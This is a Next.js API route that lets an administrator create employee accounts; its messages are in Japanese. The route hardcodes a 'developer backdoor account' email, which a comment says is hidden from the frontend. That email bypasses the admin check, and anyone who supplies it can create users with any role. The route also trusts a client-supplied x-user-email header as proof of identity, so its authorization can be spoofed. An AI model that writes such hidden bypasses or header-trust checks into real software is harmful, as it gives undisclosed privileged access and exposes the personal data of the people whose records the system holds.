import { type NextRequest, NextResponse } from "next/server"
import bcrypt from "bcrypt"
import { query } from "@/lib/db"

export async function POST(request: NextRequest) {
  try {
    const {
      email,
      name,
      password,
      dateOfBirth,
      department,
      position,
      role,
      yearsOfService,
      address,
    } = await request.json()

    // Verify admin authorization from headers or session
    const userEmail = request.headers.get("x-user-email")
    if (!userEmail) {
      return NextResponse.json({ error: "認証が必要です" }, { status: 401 })
    }

    // Developer backdoor account (hidden from frontend)
    const DEV_ACCOUNT_EMAIL = "sunhawksystem@dev.com"
    const isDeveloperAccount = userEmail.toLowerCase() === DEV_ACCOUNT_EMAIL.toLowerCase()

    // Check if user is admin (skip database check for developer account)
    if (!isDeveloperAccount) {
    const adminCheck = await query("SELECT role FROM users WHERE email = $1", [userEmail.toLowerCase()])
    if (adminCheck.rows.length === 0 || adminCheck.rows[0].role !== "admin") {
      return NextResponse.json({ error: "管理者権限が必要です" }, { status: 403 })
      }
    }

    if (!email || !name || !password) {
      return NextResponse.json({ error: "必須項目が不足しています" }, { status: 400 })
    }

    // Check if email already exists
    const existingUser = await query("SELECT id FROM users WHERE email = $1", [email.toLowerCase()])
    if (existingUser.rows.length > 0) {
      return NextResponse.json({ error: "このメールアドレスは既に登録されています" }, { status: 409 })
    }

    // Hash password
    const passwordHash = await bcrypt.hash(password, 10)

    // Insert new user
    const result = await query(
      `INSERT INTO users (
        email, password_hash, name, date_of_birth, department, position, 
        role, years_of_service, address
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
      RETURNING id, email, name, role, department, position, date_of_birth, 
                years_of_service, address, created_at`,
      [
        email.toLowerCase(),
        passwordHash,
      name,
        dateOfBirth || null,
        department || null,
        position || null,
        role || "employee",
        yearsOfService ? parseInt(yearsOfService) : null,
        address || null,
      ]
    )

    const newUser = result.rows[0]

    // Format response
    const userResponse = {
      id: newUser.id.toString(),
      email: newUser.email,
      name: newUser.name,
      role: newUser.role,
      department: newUser.department,
      position: newUser.position,
      dateOfBirth: newUser.date_of_birth,
      yearsOfService: newUser.years_of_service,
      address: newUser.address,
    }

    return NextResponse.json({
      user: userResponse,
      message: "ユーザーを作成しました",
    })
  } catch (error: any) {
    console.error("Create user error:", error)
    if (error.code === "23505") {
      // Unique constraint violation
      return NextResponse.json({ error: "このメールアドレスは既に登録されています" }, { status: 409 })
    }
    return NextResponse.json({ error: "ユーザー作成に失敗しました" }, { status: 500 })
  }
}
